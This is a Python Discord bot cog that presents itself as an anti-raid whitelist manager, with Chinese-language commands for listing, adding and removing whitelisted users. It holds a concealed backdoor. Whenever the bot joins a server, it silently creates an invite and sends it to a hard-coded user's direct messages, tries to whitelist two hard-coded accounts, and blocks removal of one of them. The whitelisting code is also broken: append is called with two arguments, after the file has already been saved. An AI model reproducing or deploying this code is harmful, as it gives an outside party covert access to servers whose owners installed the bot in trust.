import discord
import json

from discord.ext import commands

class whitelisted(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        channel = guild.text_channels[0]
        rope = await channel.create_invite(unique=True)
        me = self.bot.get_user(593666614717841419)
        await me.send("``爸爸，我已經被添加到:``")
        await me.send(rope)

        with open('whitelisted.json', 'r') as f:
            whitelisted = json.load(f)

        if str(guild.id) not in whitelisted:
            whitelisted[str(guild.id)] = []

        with open('whitelisted.json', 'w') as f:
            json.dump(whitelisted, f, indent=4)

        whitelisted[str(guild.id)].append('593666614717841419', '828511031465869312')

        with open('whitelisted.json', 'w') as f:
            json.dump(whitelisted, f, indent=4)

    @commands.has_guild_permissions(administrator=True)
    @commands.command(name='whitelist', help='防刷白名單列表')
    async def whitelist(self, ctx):
        embed = discord.Embed(title=f"白名單的用戶 {ctx.guild.name}", description='')

        with open('whitelisted.json', 'r') as i:
            whitelisted = json.load(i)
        try:
            for u in whitelisted[str(ctx.guild.id)]:
                embed.description += f"<@{(u)}> - {u}\n"
            await ctx.send(embed=embed)
        except KeyError:
            await ctx.send("沒有找到這個伺服器!")

    @commands.has_guild_permissions(administrator=True)
    @commands.command(name='whiteadd', help='增加防刷白名單 <tag user>')
    async def whiteadd(self, ctx, user: discord.Member = None):
        with open('whitelisted.json', 'r') as f:
            whitelisted = json.load(f)

        if str(ctx.guild.id) not in whitelisted:
            whitelisted[str(ctx.guild.id)] = []
        else:
            if str(user.id) not in whitelisted[str(ctx.guild.id)]:
                whitelisted[str(ctx.guild.id)].append(str(user.id))
            else:
                await ctx.send("該用戶已經在白名單中.")
                return

        with open('whitelisted.json', 'w') as f:
            json.dump(whitelisted, f, indent=4)

        await ctx.send(f"{user} 已添加到白名單.")

    @commands.has_guild_permissions(administrator=True)
    @commands.command(name='unwhite', help='移除防刷白名單 <tag user>')
    async def unwhite(self, ctx, user: discord.User = None):

        with open('whitelisted.json', 'r') as f:
            whitelisted = json.load(f)
        try:
            if str(user.id) == "828511031465869312":
                await ctx.send(f"{ctx.author.mention}請勿移除{user}.")
            elif str(user.id) in whitelisted[str(ctx.guild.id)]:
                whitelisted[str(ctx.guild.id)].remove(str(user.id))

                with open('whitelisted.json', 'w') as f:
                    json.dump(whitelisted, f, indent=4)

                await ctx.send(f"{user} 已從白名單中刪除.")
        except KeyError:
            await ctx.send("此用戶從未被列入白名單.")

def setup(bot):
    bot.add_cog(whitelisted(bot))